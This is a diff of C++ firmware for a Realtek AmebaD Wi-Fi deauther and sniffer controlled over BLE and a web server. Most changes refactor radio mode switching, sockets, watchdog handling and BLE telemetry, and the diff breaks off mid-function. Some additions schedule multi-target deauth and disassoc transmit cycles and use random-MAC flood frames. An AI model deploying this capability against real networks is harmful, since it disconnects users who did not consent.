@@ -36,26 +36,68 @@
 #include "wifi_util.h"
 #include "wifi_structures.h"
 #include "WiFi.h"
-#include "WiFiServer.h"
-#include "WiFiClient.h"
 #include "platform_stdlib.h"
 #include "osdep_service.h"
 #include "FreeRTOS.h"
 #include "semphr.h"
 #include "BLEDevice.h"
+#include "wiring_watchdog.h"
 #include <FlashMemory.h>
 #include <strings.h>
 #include <stddef.h>
 #include <errno.h>
 #include <ctype.h>
 
+#include <sys/types.h>
+#ifndef _IN_ADDR_T_DECLARED
+typedef uint32_t in_addr_t;
+#define _IN_ADDR_T_DECLARED
+#endif
+
 extern "C" {
+#include "bt_intf.h"
+#include "app_msg.h"
+#include "gap.h"
 #include "gap_le.h"
 #include "gap_adv.h"
 #include "gap_config.h"
 #include "gap_conn_le.h"
+#include "gap_msg.h"
+#include "gap_callback_le.h"
+#include "gap_bond_le.h"
 #include "gatt_builtin_services.h"
+#include <lwip/sockets.h>
 }
+
+// Strip lwIP BSD/POSIX socket compatibility macros so C++ methods (Serial.read, write, connect, etc.) are untouched
+#undef accept
+#undef bind
+#undef shutdown
+#undef getpeername
+#undef getsockname
+#undef setsockopt
+#undef getsockopt
+#undef closesocket
+#undef connect
+#undef listen
+#undef recv
+#undef recvfrom
+#undef send
+#undef sendmsg
+#undef sendto
+#undef socket
+#undef select
+#undef ioctlsocket
+#undef read
+#undef write
+#undef writev
+#undef close
+#undef fcntl
+#undef ioctl
+
+#ifndef SHUT_WR
+#define SHUT_WR 1
+#endif
 
 #ifdef max
 #undef max
@@ -65,6 +107,9 @@ extern "C" {
 #endif
 
 #include <vector>
+
+#define LOG_STR_LEN             128
+#define LOG_RING_SIZE           24
 
 //==========================
 // User Configuration
@@ -162,8 +207,11 @@ volatile int sniffed_deauth_ch = WIFI_CHANNEL;
 volatile bool has_sniffed_deauth = false;
 unsigned long last_deauth_sniff_attack = 0;
 unsigned long deauth_sniff_interval = 500;
+volatile unsigned long lastMgmtBeaconLogMs = 0;
+volatile unsigned long lastMgmtProbeLogMs = 0;
 volatile unsigned long lastCtrlLogMs = 0;
 volatile unsigned long lastDataLogMs = 0;
+volatile uint32_t promiscCallbackInFlight = 0;
 volatile bool emergencyStopRequested = false;
 volatile bool priorityStopPending = false;
 volatile bool bleCmdQueueOverflow = false;
@@ -224,12 +272,69 @@ struct WiFiStationResult {
   short rssi;
 };
 
+enum WlanRuntimeMode {
+  WLAN_MODE_UNINIT = 0,
+  WLAN_MODE_AP,
+  WLAN_MODE_STA,
+  WLAN_MODE_PROMISC
+};
+
+volatile WlanRuntimeMode wlanRuntimeMode = WLAN_MODE_UNINIT;
+bool wlanLwipInitialized = false;
+
+// Sliced non-blocking TX state for multi-target deauth / disassoc cycles (3-OptA)
+struct SlicedTxCycle {
+  bool active = false;
+  size_t targetIdx = 0;
+  unsigned long frameIdx = 0;
+  bool aborted = false;
+  std::vector<WiFiScanResult> targets;
+
+  void reset() {
+    active = false;
+    targetIdx = 0;
+    frameIdx = 0;
+    aborted = false;
+    targets.clear();
+  }
+};
+
+SlicedTxCycle deauthSlice;
+SlicedTxCycle disassocSlice;
+
+// Async non-blocking BLE scan/sync push cursor (2A flow control)
+struct BleScanPushState {
+  bool active = false;
+  bool emitBegin = false;
+  bool isSync = false;
+  bool beginSent = false;
+  size_t idx = 0;
+  unsigned long lastProgressAt = 0;
+  std::vector<WiFiScanResult> snap;
+
+  void reset() {
+    active = false;
+    emitBegin = false;
+    isSync = false;
+    beginSent = false;
+    idx = 0;
+    lastProgressAt = 0;
+    snap.clear();
+  }
+};
+
+BleScanPushState bleScanPush;
+
 // Generate a random, locally-administered MAC for flood frames
 void randomMAC(uint8_t *mac) {
   for (int i = 0; i < 6; i++) {
     mac[i] = random(0, 256);
   }
   mac[0] = (mac[0] & 0xFE) | 0x02;  // locally administered bit
+}
+
+static inline void feedWatchdog() {
+  wdt_reset();
 }
 
 // Forward declarations for functions used before definition
@@ -239,8 +344,12 @@ bool isPwnagotchiMac(const uint8_t *mac);
 bool isEAPOL(const uint8_t *buf, int len);
 bool setChannel(int newChannel);
 void resetHopState();
-void startSoftAP();
-void restoreBleCoex();
+bool startSoftAP();
+bool isSoftApHealthy();
+bool webServerRunning();
+bool startWebServer(uint8_t maxRetries = 3);
+void stopWebServer();
+void restoreBleCoex(bool resetCoex = true);
 bool enterStaMode(const char *context);
 void restoreRadioAfterSniff();
 void scheduleApRestart();
@@ -248,13 +357,29 @@ void stopAllActiveAttacks();
 void stopConflictingModesBeforeAttack();
 void clearDeauthSniffState();
 void prepareRadioForSniff(bool turnOffAp);
+void resetPromiscLogThrottle();
+void clearSniffLogRingSafe();
+void resetBleLogFlowControl();
 void startMonitorSniff(SniffMode mode, bool timed = false, unsigned long dur = 0);
 void pushSniffLog(const char *msg);
+void getBleStateSafe(uint8_t &connIdOut, bool &notifyOut);
+bool isBleReadyToNotifySafe(uint8_t &connIdOut);
+bool isBleConnectedSafe();
+bool bleSendLineCstr(const char *line, size_t lineLen, bool critical = true, bool isHeartbeat = false, uint16_t minCreditsOverride = 0);
 void bleSendLine(const String &line);
+bool bleSendSniffLog(const char *msg, bool highPriority);
+void bleSendLog(const char *msg);
 void bleSendLog(const String &msg);
-void blePushStatus();
+void blePushStatus(bool critical = true);
 void blePushInfo();
 void blePushScanResults(bool emitBegin = true, bool isSync = false);
+void pumpBleScanPush();
+void cancelBleScanPush();
+bool stepSlicedTxCycle(SlicedTxCycle &st, bool sendDeauth, bool sendDisassoc, unsigned long frameBudgetPerTick);
+void processBleDiagAndNegotiation();
+void ensureBleAdvertisingIfDisconnected();
+size_t jsonEscapeTruncatedToBuf(const char *src, char *out, size_t outSize, size_t maxEscapedBytes, const char *ellipsis = "...");
+size_t jsonEscapeToBuf(const char *src, char *out, size_t outSize);
 void pollSerialInput();
 bool isStopCmdCstr(const char *s);
 bool hasQueuedStopInCmdRing();
@@ -309,7 +434,33 @@ static inline bool is_broadcast_mac(const uint8_t *mac) {
 // =========================
 // Promiscuous Callback
 // =========================
+struct PromiscFlightGuard {
+  PromiscFlightGuard() {
+    rtw_enter_critical(NULL, NULL);
+    promiscCallbackInFlight++;
+    rtw_exit_critical(NULL, NULL);
+  }
+  ~PromiscFlightGuard() {
+    rtw_enter_critical(NULL, NULL);
+    if (promiscCallbackInFlight > 0) {
+      promiscCallbackInFlight--;
+    }
+    rtw_exit_critical(NULL, NULL);
+  }
+};
+
+void resetPromiscLogThrottle() {
+  rtw_enter_critical(NULL, NULL);
+  lastMgmtBeaconLogMs = 0;
+  lastMgmtProbeLogMs = 0;
+  lastCtrlLogMs = 0;
+  lastDataLogMs = 0;
+  rtw_exit_critical(NULL, NULL);
+}
+
 void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
+  PromiscFlightGuard flightGuard;
+
   SniffMode modeSnapshot;
   bool sniffingSnapshot;
   bool deauthSniffSnapshot;
@@ -355,24 +506,36 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
       return;
   }
 
-  char logBuf[192];
+  char logBuf[LOG_STR_LEN];
   const uint8_t *framePtr = (const uint8_t *)buf;
 
   if (ftype == 0) {
-    char ssidBuf[65];
-    char mac2[18], mac1[18];
     if (fsubtype == 8) {
+      bool isPwn = isPwnagotchiMac(hdr->addr2);
+      if (!isPwn) {
+        unsigned long now = millis();
+        rtw_enter_critical(NULL, NULL);
+        if (lastMgmtBeaconLogMs != 0 && (now - lastMgmtBeaconLogMs < 80)) {
+          rtw_exit_critical(NULL, NULL);
+          return;
+        }
+        lastMgmtBeaconLogMs = now;
+        rtw_exit_critical(NULL, NULL);
+      }
+      char mac2[18];
+      char ssidBuf[36];
       formatMac(hdr->addr2, mac2, sizeof(mac2));
       extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
       if (ssidBuf[0] != '\0') {
         snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s SSID: %s%s",
                  mac2, ssidBuf,
-                 isPwnagotchiMac(hdr->addr2) ? " Pwnagotchi Beacon!" : "");
+                 isPwn ? " Pwnagotchi Beacon!" : "");
       } else {
         snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s", mac2);
       }
     }
     else if (fsubtype == 12) {
+      char mac2[18], mac1[18];
       formatMac(hdr->addr2, mac2, sizeof(mac2));
       formatMac(hdr->addr1, mac1, sizeof(mac1));
       if (len >= 26) {
@@ -391,25 +554,37 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
         rtw_exit_critical(NULL, NULL);
       }
     }
-    else if (fsubtype == 4) {
-      formatMac(hdr->addr2, mac2, sizeof(mac2));
-      extractSsidCstr(framePtr, len, 24, ssidBuf, sizeof(ssidBuf));
-      if (ssidBuf[0] != '\0') {
-        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s Probe SSID: %s", mac2, ssidBuf);
-      } else {
-        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s", mac2);
+    else if (fsubtype == 4 || fsubtype == 5) {
+      unsigned long now = millis();
+      rtw_enter_critical(NULL, NULL);
+      if (lastMgmtProbeLogMs != 0 && (now - lastMgmtProbeLogMs < 80)) {
+        rtw_exit_critical(NULL, NULL);
+        return;
       }
-    }
-    else if (fsubtype == 5) {
+      lastMgmtProbeLogMs = now;
+      rtw_exit_critical(NULL, NULL);
+
+      char mac2[18];
+      char ssidBuf[36];
       formatMac(hdr->addr2, mac2, sizeof(mac2));
-      extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
-      if (ssidBuf[0] != '\0') {
-        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s SSID: %s", mac2, ssidBuf);
+      if (fsubtype == 4) {
+        extractSsidCstr(framePtr, len, 24, ssidBuf, sizeof(ssidBuf));
+        if (ssidBuf[0] != '\0') {
+          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s Probe SSID: %s", mac2, ssidBuf);
+        } else {
+          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s", mac2);
+        }
       } else {
-        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s", mac2);
+        extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
+        if (ssidBuf[0] != '\0') {
+          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s SSID: %s", mac2, ssidBuf);
+        } else {
+          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s", mac2);
+        }
       }
     }
     else if (fsubtype == 10) {
+      char mac2[18], mac1[18];
       formatMac(hdr->addr2, mac2, sizeof(mac2));
       formatMac(hdr->addr1, mac1, sizeof(mac1));
       if (len >= 26) {
@@ -428,7 +603,7 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
     // SNIFF_ALL 下对高频 ACK/RTS 等控制帧做 300ms 独立限频，限流通过后再构造日志
     unsigned long now = millis();
     rtw_enter_critical(NULL, NULL);
-    if (now - lastCtrlLogMs < 300) {
+    if (lastCtrlLogMs != 0 && (now - lastCtrlLogMs < 300)) {
       rtw_exit_critical(NULL, NULL);
       return;
     }
@@ -445,7 +620,7 @@ void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/)
     } else {
       unsigned long now = millis();
       rtw_enter_critical(NULL, NULL);
-      if (now - lastDataLogMs < 300) {
+      if (lastDataLogMs != 0 && (now - lastDataLogMs < 300)) {
         rtw_exit_critical(NULL, NULL);
         return;
       }
@@ -556,8 +731,34 @@ void startSniffing() {
     Serial.println("[INFO] Enabling promiscuous mode...");
     // Shut down HTTP listening socket cleanly before wifi_enter_promisc_mode() calls wifi_off()
     prepareRadioForSniff(false);
-    wifi_enter_promisc_mode();
-    restoreBleCoex();
+    resetPromiscLogThrottle();
+    WlanRuntimeMode prevMode = wlanRuntimeMode;
+    feedWatchdog();
+    int preWextMode = -1;
+    if (wlanRuntimeMode == WLAN_MODE_UNINIT || wext_get_mode(WLAN0_NAME, &preWextMode) != RTW_SUCCESS) {
+      if (wifi_on(RTW_MODE_PROMISC) != RTW_SUCCESS) {
+        wlanRuntimeMode = WLAN_MODE_UNINIT;
+        timedSniffEnabled = false;
+        rtw_enter_critical(NULL, NULL);
+        isSniffing = false;
+        currentMode = SNIFF_STOP;
+        rtw_exit_critical(NULL, NULL);
+        Serial.println("[ERROR] startSniffing: wifi_on(RTW_MODE_PROMISC) failed.");
+        restoreRadioAfterSniff();
+        return;
+      }
+      delay(20);
+      feedWatchdog();
+    } else {
+      wifi_enter_promisc_mode();
+      feedWatchdog();
+    }
+    int wextMode = -1;
+    wext_get_mode(WLAN0_NAME, &wextMode);
+    bool stayedSta = (prevMode == WLAN_MODE_STA && wextMode == RTW_MODE_INFRA);
+    wlanRuntimeMode = stayedSta ? WLAN_MODE_STA : WLAN_MODE_PROMISC;
+    WiFi.disablePowerSave();
+    restoreBleCoex(!stayedSta);
     int targetCh = getCurrentChannelSafe();
     setChannel(targetCh);
 
@@ -583,21 +784,37 @@ void startSniffing() {
   }
 }
 
+// Wait briefly for any in-flight Wi-Fi RX promisc callback before tearing down WLAN/switching mode
+static void waitForPromiscCallbacksIdle() {
+  unsigned long waitedMs = 0;
+  while (waitedMs < 60) {
+    uint32_t inFlight = 0;
+    rtw_enter_critical(NULL, NULL);
+    inFlight = promiscCallbackInFlight;
+    rtw_exit_critical(NULL, NULL);
+    if (inFlight == 0) break;
+    feedWatchdog();
+    delay(2);
+    waitedMs += 2;
+  }
+  delay(5);
+}
+
 // 停止混杂抓包与伴生 Deauth 嗅探状态，但不触发 AP/STA 模式切换
 bool haltPromiscSniff() {
   timedSniffEnabled = false;
   bool active = false;
   rtw_enter_critical(NULL, NULL);
   active = (isSniffing || deauth_sniff_enabled);
-  rtw_exit_critical(NULL, NULL);
-  if (!active) return false;
-
-  // 先关闭底层混杂回调，再清理共享状态位
-  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
-  rtw_enter_critical(NULL, NULL);
   isSniffing = false;
   currentMode = SNIFF_STOP;
   rtw_exit_critical(NULL, NULL);
+  if (!active) return false;
+
+  // 先关闭底层混杂回调并等待在途 RX 回调彻底退出，防止后续 wifi_off() 撕裂驱动状态
+  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
+  waitForPromiscCallbacksIdle();
+  resetPromiscLogThrottle();
   clearDeauthSniffState();
   resetHopState();
   return true;
@@ -780,8 +997,6 @@ uint32_t tx_fail_count          = 0;
 #define CHARACTERISTIC_UUID_RX  "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
 #define CHARACTERISTIC_UUID_TX  "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"
 #define BLE_BUF_SIZE            220   // < CHAR_VALUE_MAX_LEN (230)
-#define LOG_STR_LEN             128
-#define LOG_RING_SIZE           24
 
 BLEService UartService(UART_SERVICE_UUID);
 BLECharacteristic BleRx(CHARACTERISTIC_UUID_RX);
@@ -789,8 +1004,70 @@ BLECharacteristic BleTx(CHARACTERISTIC_UUID_TX);
 BLEAdvertData advdata;
 BLEAdvertData scndata;
 volatile bool bleNotifyEnabled = false;
-volatile uint8_t activeConnId = 0;  // 当前 BLE 连接 ID（configServer(1) 下恒为 0，但语义上应记录回调传入值）
+volatile uint8_t activeConnId = 0;  // 当前 BLE 连接 ID（所有跨任务读写均受临界区保护）
 volatile bool bleStarted = false;
+volatile bool bleAdvUpdateInProgress = false;
+volatile T_GAP_CONN_STATE bleGapConnState = GAP_CONN_STATE_DISCONNECTED;
+
+// GAP telemetry & negotiation state shared between appGapCallback (BT task) and loop() (1A+1C+4A)
+struct BleGapTelemetry {
+  bool evConnected = false;
+  bool evDisconnected = false;
+  bool evParamUpdated = false;
+  bool evParamUpdateFailed = false;
+  bool evPhyUpdated = false;
+  bool evMtuUpdated = false;
+  bool evConnUpdateInd = false;
+
+  uint8_t connId = 0;
+  uint16_t initInterval = 0;
+  uint16_t initLatency = 0;
+  uint16_t initTimeout = 0;
+  uint8_t initTxPhy = 0;
+  uint8_t initRxPhy = 0;
+
+  uint8_t discConnId = 0;
+  uint16_t discCause = 0;
+
+  uint16_t updInterval = 0;
+  uint16_t updLatency = 0;
+  uint16_t updTimeout = 0;
+  uint16_t paramFailCause = 0;
+
+  uint16_t phyCause = 0;
+  uint8_t phyTx = 0;
+  uint8_t phyRx = 0;
+
+  uint8_t mtuConnId = 0;
+  uint16_t mtuSize = 23;
+
+  uint16_t indMin = 0;
+  uint16_t indMax = 0;
+  uint16_t indLat = 0;
+  uint16_t indTout = 0;
+  bool indRejected = false;
+
+  bool negotiatePending = false;
+  uint8_t negotiateAttempts = 0;
+  unsigned long connectedAtMs = 0;
+  unsigned long lastNegotiateMs = 0;
+
+  bool phyReassertDone = false;
+  uint8_t phyReassertAttempts = 0;
+  unsigned long lastPhyReqMs = 0;
+};
+
+BleGapTelemetry bleGapDiag;
+volatile uint32_t bleDroppedLogCount = 0;
+unsigned long lastBleDroppedWarnMs = 0;
+
+// Adaptive BLE sniff-log congestion control & pacing (P0-2)
+#define BLE_SNIFF_BASE_INTERVAL_MS     100UL
+#define BLE_SNIFF_LOW_MTU_INTERVAL_MS  220UL
+#define BLE_SNIFF_MAX_BACKOFF_MS       800UL
+unsigned long bleLogBackoffMs = BLE_SNIFF_BASE_INTERVAL_MS;
+unsigned long lastBleRoutineLogMs = 0;
+unsigned long lastBlePriorityLogMs = 0;
 
 // Cross-thread command ring queue (BLE task -> loop)
 #define CMD_RING_SIZE 16
@@ -942,8 +1219,8 @@ void pollSerialInput() {
     int raw = Serial.read();
     if (raw < 0) break;
     char c = (char)raw;
-    if (c == '\r') continue;
-    if (c == '\n') {
+    if (c == '\0') continue;
+    if (c == '\r' || c == '\n') {
       if (serialRxOverflow) {
         serialRxOverflow = false;
         serialRxLen = 0;
@@ -963,6 +1240,8 @@ void pollSerialInput() {
       if (end > start) {
         const char *line = &serialRxBuf[start];
         if (isStopCmdCstr(line)) {
+          Serial.print("> ");
+          Serial.println(line);
           rtw_enter_critical(NULL, NULL);
           emergencyStopRequested = true;
           priorityStopPending = true;
@@ -975,6 +1254,8 @@ void pollSerialInput() {
             strncpy(serialCmdQueue[serialCmdHead], line, sizeof(serialCmdQueue[0]) - 1);
             serialCmdQueue[serialCmdHead][sizeof(serialCmdQueue[0]) - 1] = '\0';
             serialCmdHead = next;
+            Serial.print("> ");
+            Serial.println(line);
           } else {
             Serial.println("[WARN] Serial command queue full; dropped command.");
           }
@@ -1102,14 +1383,150 @@ void saveConfigToFlash() {
 }
 
 //==========================================================
-// Web Server
+// Web Server (Direct lwIP BSD Sockets with SO_REUSEADDR)
 //==========================================================
-WiFiServer webServer(80);
+// Bypasses AmebaD WiFiServer/ard_socket start_server() which lacks SO_REUSEADDR,
+// leaks _sock on bind() failure, and causes UB in get_sock_errno(-1) / Spin on EAGAIN.
+static int webListenSock = -1;
+
+bool webServerRunning() {
+  return webListenSock >= 0;
+}
+
+void stopWebServer() {
+  if (webListenSock >= 0) {
+    lwip_close(webListenSock);
+    webListenSock = -1;
+  }
+}
+
+bool startWebServer(uint8_t maxRetries) {
+  if (maxRetries == 0) maxRetries = 1;
+  stopWebServer();
+
+  for (uint8_t attempt = 0; attempt < maxRetries; attempt++) {
+    feedWatchdog();
+    int fd = lwip_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (fd < 0) {
+      Serial.println("[ERROR] WebServer lwip_socket() failed");
+    } else {
+      int reuse = 1;
+      int rcvTimeoutMs = 3000;
+      lwip_setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+      lwip_setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &rcvTimeoutMs, sizeof(rcvTimeoutMs));
+
+      int flags = lwip_fcntl(fd, F_GETFL, 0);
+      if (flags >= 0) {
+        lwip_fcntl(fd, F_SETFL, flags | O_NONBLOCK);
+      }
+
+      struct sockaddr_in localAddr;
+      memset(&localAddr, 0, sizeof(localAddr));
+      localAddr.sin_family = AF_INET;
+      localAddr.sin_port = htons(80);
+      localAddr.sin_addr.s_addr = INADDR_ANY;
+
+      if (lwip_bind(fd, (struct sockaddr *)&localAddr, sizeof(localAddr)) < 0) {
+        int err = lwip_getsocklasterr(fd);
+        lwip_close(fd);
+        Serial.print("[ERROR] WebServer bind(80) failed errno=");
+        Serial.print(err);
+        Serial.print(" attempt=");
+        Serial.println((unsigned)(attempt + 1));
+      } else if (lwip_listen(fd, 4) < 0) {
+        int err = lwip_getsocklasterr(fd);
+        lwip_close(fd);
+        Serial.print("[ERROR] WebServer listen(80) failed errno=");
+        Serial.print(err);
+        Serial.print(" attempt=");
+        Serial.println((unsigned)(attempt + 1));
+      } else {
+        webListenSock = fd;
+        return true;
+      }
+    }
+    if (attempt + 1 < maxRetries) {
+      unsigned long backoffMs = 50UL * (unsigned long)(attempt + 1);
+      delay(backoffMs);
+      feedWatchdog();
+    }
+  }
+  return false;
+}
+
+static int acceptWebClient() {
+  if (webListenSock < 0) return -1;
+  struct sockaddr_in peerAddr;
+  socklen_t peerLen = sizeof(peerAddr);
+  int cli = lwip_accept(webListenSock, (struct sockaddr *)&peerAddr, &peerLen);
+  if (cli < 0) {
+    return -1;
+  }
+  int flags = lwip_fcntl(cli, F_GETFL, 0);
+  if (flags >= 0) {
+    lwip_fcntl(cli, F_SETFL, flags & ~O_NONBLOCK);
+  }
+  int reuse = 1;
+  int rcvTimeoutMs = 25;
+  int sndTimeoutMs = 1500;
+  int nodelay = 1;
+  // Inherit SO_REUSEADDR on client sockets too so lingering FIN_WAIT PCBs never block bind(80) after AP restart
+  lwip_setsockopt(cli, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+  lwip_setsockopt(cli, SOL_SOCKET, SO_RCVTIMEO, &rcvTimeoutMs, sizeof(rcvTimeoutMs));
+  lwip_setsockopt(cli, SOL_SOCKET, SO_SNDTIMEO, &sndTimeoutMs, sizeof(sndTimeoutMs));
+  lwip_setsockopt(cli, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
+  return cli;
+}
+
+static int webClientRecv(int sock, uint8_t *buf, size_t len, bool &peerClosedOrErr) {
+  peerClosedOrErr = false;
+  if (sock < 0 || !buf || len == 0) {
+    peerClosedOrErr = true;
+    return -1;
+  }
+  int r = lwip_recv(sock, buf, len, 0);
+  if (r > 0) return r;
+  if (r == 0) {
+    peerClosedOrErr = true;
+    return 0;
+  }
+  int err = lwip_getsocklasterr(sock);
+  if (err == EAGAIN || err == EWOULDBLOCK || err == EINTR) {
+    return 0;
+  }
+  peerClosedOrErr = true;
+  return -1;
+}
+
+static void closeWebClient(int &sock, bool gracefulDrain) {
+  if (sock < 0) return;
+  if (gracefulDrain) {
+    lwip_shutdown(sock, SHUT_WR);
+    int flags = lwip_fcntl(sock, F_GETFL, 0);
+    if (flags >= 0) {
+      lwip_fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    }
+    uint8_t sink[64];
+    for (int i = 0; i < 4; i++) {
+      int r = lwip_recv(sock, sink, sizeof(sink), 0);
+      if (r <= 0) break;
+    }
+    delay(5);
+  }
+  lwip_close(sock);
+  sock = -1;
+}
 
 // Wi-Fi 重启/切模后重新启用 Wi-Fi/BLE 共存仲裁，避免 BLE notify 吞吐或广播被抑制
-void restoreBleCoex() {
-  if (bleStarted) {
-    wifi_btcoex_set_bt_on();
+void restoreBleCoex(bool resetCoex) {
+  if (!bleStarted) return;
+  wifi_btcoex_set_bt_on();
+  // rtw_coex_bt_enable(0/1) 直接操作 pcoex，仅在 WLAN 接口已就绪时调用
+  if (wifi_is_up(RTW_STA_INTERFACE) || wifi_is_up(RTW_AP_INTERFACE)) {
+    if (resetCoex) {
+      rltk_coex_bt_enable(0);
+    }
+    rltk_coex_bt_enable(1);
   }
 }
 
@@ -1132,45 +1549,129 @@ void restoreDefaultChannelIfNeeded(bool force) {
   }
 }
 
-void startSoftAP() {
+bool isSoftApHealthy() {
+  int wextMode = -1;
+  return (wlanRuntimeMode == WLAN_MODE_AP &&
+          softApActive &&
+          wifi_is_up(RTW_AP_INTERFACE) &&
+          wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
+          wextMode == RTW_MODE_MASTER);
+}
+
+bool startSoftAP() {
   // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
-  webServer.end();
+  stopWebServer();
   softApActive = false;
-  // Force-close WLAN first: after promisc mode WLAN0 is still "running", so a
-  // bare wifi_on(RTW_MODE_AP) would be blocked by rltk_wlan_running() and the
-  // radio would never switch back to AP.
-  wifi_off();
-  delay(20);
+  apEnabled = true;
+  feedWatchdog();
+
   char ch[4];
   snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);
-  // WiFi.apbegin() completes the full stack init that wifi_start_ap() skips:
-  // wifi_on + LwIP_Init + netif_set_addr(192.168.1.1) + dhcps_init (DHCP server).
-  WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
-  webServer.begin();
-  apEnabled = true;
-  softApActive = true;
-  setCurrentChannelSafe(WIFI_CHANNEL);
-  restoreBleCoex();
+
+  for (uint8_t attempt = 0; attempt < 2; attempt++) {
+    if (attempt > 0) {
+      Serial.println("[WARN] startSoftAP: retrying AP + WebServer recovery...");
+    }
+    // 修复 WiFiDrv 静态 init_wlan/wifi_mode 失同步（2-OptA）：
+    // 首次启动由 WiFi.apbegin()->wifiDriverInit() 完成 LwIP_Init；后续重启 WiFiDrv::wifi_mode 仍为
+    // RTW_MODE_AP，会跳过 wifi_on(RTW_MODE_AP)，因此必须显式重置为 RTW_MODE_AP。
+    if (wlanLwipInitialized) {
+      wifi_off();
+      feedWatchdog();
+      delay(40);
+      if (wifi_on(RTW_MODE_AP) != RTW_SUCCESS) {
+        wlanRuntimeMode = WLAN_MODE_UNINIT;
+        Serial.println("[ERROR] startSoftAP: wifi_on(RTW_MODE_AP) failed");
+        continue;
+      }
+      delay(20);
+      feedWatchdog();
+    } else if (wlanRuntimeMode != WLAN_MODE_UNINIT) {
+      wifi_off();
+      feedWatchdog();
+      delay(40);
+    }
+
+    int apRes = WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
+    wlanLwipInitialized = true;
+    feedWatchdog();
+
+    int wextMode = -1;
+    bool apUp = (apRes == WL_CONNECTED &&
+                 wifi_is_up(RTW_AP_INTERFACE) &&
+                 wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
+                 wextMode == RTW_MODE_MASTER);
+    if (!apUp) {
+      wlanRuntimeMode = wifi_is_up(RTW_AP_INTERFACE) ? WLAN_MODE_AP : WLAN_MODE_UNINIT;
+      Serial.println("[ERROR] startSoftAP: WiFi.apbegin() failed or AP interface not up");
+      continue;
+    }
+
+    wlanRuntimeMode = WLAN_MODE_AP;
+    WiFi.disablePowerSave();
+    softApActive = true;
+    setCurrentChannelSafe(WIFI_CHANNEL);
+    restoreBleCoex(true);
+
+    if (startWebServer(3)) {
+      return true;
+    }
+    Serial.println("[ERROR] startSoftAP: WebServer bind(80) failed after retries");
+    stopWebServer();
+    softApActive = false;
+  }
+
+  int wextMode = -1;
+  if (wifi_is_up(RTW_AP_INTERFACE) &&
+      wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
+      wextMode == RTW_MODE_MASTER) {
+    wlanRuntimeMode = WLAN_MODE_AP;
+    WiFi.disablePowerSave();
+    softApActive = true;
+    setCurrentChannelSafe(WIFI_CHANNEL);
+    restoreBleCoex(true);
+    return webServerRunning();
+  }
+
+  wlanRuntimeMode = WLAN_MODE_UNINIT;
+  softApActive = false;
+  WiFi.disablePowerSave();
+  restoreBleCoex(false);
+  return false;
 }
 
 // 切换至纯 STA 模式并恢复默认信道与 BLE 共存（供 ap off 与抓包退出/失败回滚复用）
 bool enterStaMode(const char *context) {
-  webServer.end();
+  stopWebServer();
   softApActive = false;
-  wifi_off();
-  delay(20);
-  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
-    Serial.print("[ERROR] wifi_on(RTW_MODE_STA) failed");
-    if (context && context[0] != '\0') {
-      Serial.print(" (");
-      Serial.print(context);
-      Serial.print(")");
+  int wextMode = -1;
+  bool alreadySta = (wlanRuntimeMode == WLAN_MODE_STA &&
+                   wifi_is_up(RTW_STA_INTERFACE) &&
+                   !wifi_is_up(RTW_AP_INTERFACE) &&
+                   wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
+                   wextMode == RTW_MODE_INFRA);
+  if (!alreadySta) {
+    wifi_off();
+    feedWatchdog();
+    delay(40);
+    if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
+      wlanRuntimeMode = WLAN_MODE_UNINIT;
+      Serial.print("[ERROR] wifi_on(RTW_MODE_STA) failed");
+      if (context && context[0] != '\0') {
+        Serial.print(" (");
+        Serial.print(context);
+        Serial.print(")");
+      }
+      Serial.println(".");
+      restoreBleCoex(false);
+      return false;
     }
-    Serial.println(".");
-    restoreBleCoex();
-    return false;
+    delay(20);
+    feedWatchdog();
+    wlanRuntimeMode = WLAN_MODE_STA;
   }
-  restoreBleCoex();
+  WiFi.disablePowerSave();
+  restoreBleCoex(!alreadySta);
   if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
     setCurrentChannelSafe(WIFI_CHANNEL);
   } else {
@@ -1186,8 +1687,14 @@ void restoreRadioAfterSniff() {
   if (apEnabled) {
     // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
     // bring the AP and web server back up so the phone can reconnect.
-    startSoftAP();
